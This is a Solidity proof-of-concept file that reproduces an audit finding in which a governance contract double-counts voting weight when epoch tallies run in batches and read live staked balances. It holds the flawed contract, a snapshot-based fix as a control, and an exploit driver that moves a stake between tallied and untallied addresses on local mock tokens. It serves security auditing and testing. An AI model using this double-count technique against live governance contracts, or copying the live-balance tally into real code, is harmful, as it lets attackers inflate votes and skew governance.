// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of BMX Deli Swap finding 62809 (H-2):
// "Users' voting weight can be double-counted when finalize epoch is processed
//  in multiple steps".
//
// In Voter.sol, the admin tallies an epoch's auto-votes via `finalizeEpoch`,
// which processes the (unbounded) auto-voter list in batches by calling
// `_tallyAutoVotes(ep, maxBatch)`. Because the tally reads the voter's *live*
// SBF_BMX balance at tally time, an attacker controlling two addresses in
// DIFFERENT batches can unstake sbfBMX from an already-tallied address (batch 1)
// and restake it to a not-yet-tallied address (batch 2). The same balance is
// then counted a second time, inflating a voting option's weight.
//
// The `_tallyAutoVotes` body below is the VERBATIM audited source embedded in
// the finding (imports/decorations stripped). The `// @>` line is the exact
// defect: the live balance is used instead of a snapshot.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Token boundary: the staking-derived sbfBMX balance the tally reads.
///      Faithful minimal double — `move` models Alice unstaking from A and
///      restaking to B (her own funds; she is authorised to do this).
interface ISbfBMX {
    function balanceOf(address account) external view returns (uint256);
}

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Alice unstakes from `from` and restakes to `to` (same sbfBMX balance).
    function move(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: the minimal Voter state the tally touches plus the
// VERBATIM `_tallyAutoVotes` body from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract Voter {
    struct EpochData {
        mapping(uint8 => uint256) optionWeight;
    }

    ISbfBMX public SBF_BMX;

    mapping(uint256 => EpochData) internal epochInfo;
    address[] public autoVoterList;
    mapping(address => uint8) public autoOption;
    mapping(uint256 => uint256) public batchCursor;
    mapping(uint256 => mapping(address => uint256)) public userVoteWeight;
    mapping(uint256 => mapping(address => uint8)) public userChoice;
    mapping(uint256 => address[]) internal pendingRemovals;

    constructor(address sbfBmx) {
        SBF_BMX = ISbfBMX(sbfBmx);
    }

    /// @dev Processes up to `maxBatch` auto-voters for `ep`, adding live balances to option weights.
    function _tallyAutoVotes(uint256 ep, uint256 maxBatch) internal returns (bool finished) {
        EpochData storage e = epochInfo[ep];
        uint256 processed;
        while (processed < maxBatch && batchCursor[ep] < autoVoterList.length) {
            uint256 i = batchCursor[ep];
            address voterAddr = autoVoterList[i];
            batchCursor[ep] = i + 1;
            processed++;

            uint8 opt = autoOption[voterAddr];
            if (opt >= 3) continue; // disabled
            if (userVoteWeight[ep][voterAddr] > 0) continue;

            //@audit current balance is used for voterAddr
            uint256 bal = SBF_BMX.balanceOf(voterAddr); // @> live balance read at tally time — enables cross-batch double-count
            if (bal == 0) {
                // queue for removal instead of removing now
                pendingRemovals[ep].push(voterAddr);
                continue;
            }
            e.optionWeight[opt] += bal;
            userVoteWeight[ep][voterAddr] = bal;
            userChoice[ep][voterAddr] = opt;
        }

        finished = (batchCursor[ep] >= autoVoterList.length);

        // process removals only after loop is complete
        if (finished && pendingRemovals[ep].length > 0) {
            _processPendingRemovals(ep);
        }
    }

    /// @dev Minimal faithful helper (out of the finding's scope, never hit on the
    ///      exploit path where both balances are non-zero at tally time).
    function _processPendingRemovals(uint256 ep) internal {
        address[] storage rem = pendingRemovals[ep];
        for (uint256 k = 0; k < rem.length; k++) {
            address target = rem[k];
            for (uint256 j = 0; j < autoVoterList.length; j++) {
                if (autoVoterList[j] == target) {
                    autoVoterList[j] = autoVoterList[autoVoterList.length - 1];
                    autoVoterList.pop();
                    break;
                }
            }
            delete autoOption[target];
        }
        delete pendingRemovals[ep];
    }

    // --- driver surface (mimics finalizeEpoch + registration/read helpers) ---

    function registerAutoVoter(address voter, uint8 opt) external {
        autoVoterList.push(voter);
        autoOption[voter] = opt;
    }

    function finalizeEpoch(uint256 ep, uint256 maxBatch) external returns (bool finished) {
        finished = _tallyAutoVotes(ep, maxBatch);
    }

    function getOptionWeight(uint256 ep, uint8 opt) external view returns (uint256) {
        return epochInfo[ep].optionWeight[opt];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): the recommendation's snapshot system.
// Balances are snapshotted once when finalization starts; the tally reads the
// snapshot, so moving a balance between batches is counted only once.
// ─────────────────────────────────────────────────────────────────────────────
contract VoterFixed {
    struct EpochData {
        mapping(uint8 => uint256) optionWeight;
    }

    ISbfBMX public SBF_BMX;

    mapping(uint256 => EpochData) internal epochInfo;
    address[] public autoVoterList;
    mapping(address => uint8) public autoOption;
    mapping(uint256 => uint256) public batchCursor;
    mapping(uint256 => mapping(address => uint256)) public userVoteWeight;
    mapping(uint256 => mapping(address => uint8)) public userChoice;
    mapping(uint256 => address[]) internal pendingRemovals;

    // FIX: per-epoch balance snapshot captured at the start of finalization.
    mapping(uint256 => mapping(address => uint256)) public snapshotBal;

    constructor(address sbfBmx) {
        SBF_BMX = ISbfBMX(sbfBmx);
    }

    /// @dev Snapshot every auto-voter's balance once, before any batch runs.
    function startFinalization(uint256 ep) external {
        for (uint256 i = 0; i < autoVoterList.length; i++) {
            address v = autoVoterList[i];
            snapshotBal[ep][v] = SBF_BMX.balanceOf(v);
        }
    }

    function _tallyAutoVotes(uint256 ep, uint256 maxBatch) internal returns (bool finished) {
        EpochData storage e = epochInfo[ep];
        uint256 processed;
        while (processed < maxBatch && batchCursor[ep] < autoVoterList.length) {
            uint256 i = batchCursor[ep];
            address voterAddr = autoVoterList[i];
            batchCursor[ep] = i + 1;
            processed++;

            uint8 opt = autoOption[voterAddr];
            if (opt >= 3) continue; // disabled
            if (userVoteWeight[ep][voterAddr] > 0) continue;

            uint256 bal = snapshotBal[ep][voterAddr]; // FIX: read the frozen snapshot, not the live balance
            if (bal == 0) {
                pendingRemovals[ep].push(voterAddr);
                continue;
            }
            e.optionWeight[opt] += bal;
            userVoteWeight[ep][voterAddr] = bal;
            userChoice[ep][voterAddr] = opt;
        }

        finished = (batchCursor[ep] >= autoVoterList.length);
        if (finished && pendingRemovals[ep].length > 0) {
            _processPendingRemovals(ep);
        }
    }

    function _processPendingRemovals(uint256 ep) internal {
        address[] storage rem = pendingRemovals[ep];
        for (uint256 k = 0; k < rem.length; k++) {
            address target = rem[k];
            for (uint256 j = 0; j < autoVoterList.length; j++) {
                if (autoVoterList[j] == target) {
                    autoVoterList[j] = autoVoterList[autoVoterList.length - 1];
                    autoVoterList.pop();
                    break;
                }
            }
            delete autoOption[target];
        }
        delete pendingRemovals[ep];
    }

    function registerAutoVoter(address voter, uint8 opt) external {
        autoVoterList.push(voter);
        autoOption[voter] = opt;
    }

    function finalizeEpoch(uint256 ep, uint256 maxBatch) external returns (bool finished) {
        finished = _tallyAutoVotes(ep, maxBatch);
    }

    function getOptionWeight(uint256 ep, uint8 opt) external view returns (uint256) {
        return epochInfo[ep].optionWeight[opt];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: Alice controls VOTER_A (batch 1) and VOTER_B (batch 2). She
// stakes at A, lets batch 1 tally A, then unstakes A -> restakes B, so batch 2
// tallies the SAME sbfBMX again. Option OPT ends at 2x the real stake. The
// phantom (double-counted) weight is recorded on a MARKER token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    address internal constant VOTER_A = 0x000000000000000000000000000000000000A11A; // Alice's addr in batch 1
    address internal constant VOTER_B = 0x000000000000000000000000000000000000B0Bb; // Alice's addr in batch 2

    uint256 internal constant EPOCH = 1;
    uint8 internal constant OPT = 0; // the option Alice inflates
    uint256 internal constant STAKE = 1000 ether;

    // deployed doubles / vulnerable + fixed contracts
    MiniToken internal sbfBMX;
    Voter internal voter;
    MiniToken internal sbfBMXF;
    VoterFixed internal voterFixed;
    MiniToken internal marker;

    // exposed results for the driver to assert on
    address public voterAddr;
    address public voterFixedAddr;
    address public markerAddr;
    uint256 public buggyOptionWeight;
    uint256 public fixedOptionWeight;
    uint256 public realStake;
    uint256 public phantomWeight;
    uint256 public sinkMarkerBalance;

    constructor() {
        sbfBMX = new MiniToken("Staked BMX", "sbfBMX"); // deploy 0
        voter = new Voter(address(sbfBMX)); // deploy 1
        sbfBMXF = new MiniToken("Staked BMX", "sbfBMX"); // deploy 2
        voterFixed = new VoterFixed(address(sbfBMXF)); // deploy 3
        marker = new MiniToken("Phantom Vote Weight", "PHANTOM-VOTE-WEIGHT"); // deploy 4 (LAST)

        voterAddr = address(voter);
        voterFixedAddr = address(voterFixed);
        markerAddr = address(marker);
    }

    function run() external payable {
        // ---------------- BUGGY path (real double-count) ----------------
        voter.registerAutoVoter(VOTER_A, OPT); // batch 1
        voter.registerAutoVoter(VOTER_B, OPT); // batch 2
        sbfBMX.mint(VOTER_A, STAKE); // Alice stakes at A; B holds nothing

        voter.finalizeEpoch(EPOCH, 1); // batch 1: tallies A -> optionWeight += STAKE
        sbfBMX.move(VOTER_A, VOTER_B, STAKE); // between batches: unstake A, restake B
        voter.finalizeEpoch(EPOCH, 1); // batch 2: tallies B -> optionWeight += STAKE AGAIN

        buggyOptionWeight = voter.getOptionWeight(EPOCH, OPT);

        // ---------------- FIXED path (negative control) ----------------
        voterFixed.registerAutoVoter(VOTER_A, OPT);
        voterFixed.registerAutoVoter(VOTER_B, OPT);
        sbfBMXF.mint(VOTER_A, STAKE);

        voterFixed.startFinalization(EPOCH); // snapshot: A=STAKE, B=0
        voterFixed.finalizeEpoch(EPOCH, 1); // batch 1: tallies A from snapshot
        sbfBMXF.move(VOTER_A, VOTER_B, STAKE); // Alice tries the same trick
        voterFixed.finalizeEpoch(EPOCH, 1); // batch 2: B snapshot == 0 -> ignored

        fixedOptionWeight = voterFixed.getOptionWeight(EPOCH, OPT);

        // ---------------- harm accounting ----------------
        realStake = STAKE;
        phantomWeight = buggyOptionWeight - realStake; // inflation credited to Alice's option

        require(buggyOptionWeight == 2 * STAKE, "buggy did not double-count");
        require(fixedOptionWeight == STAKE, "fixed did not count once");
        require(phantomWeight == STAKE, "phantom weight mismatch");

        // record the phantom (double-counted) vote weight on the marker to the SINK
        marker.mint(SINK, phantomWeight);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
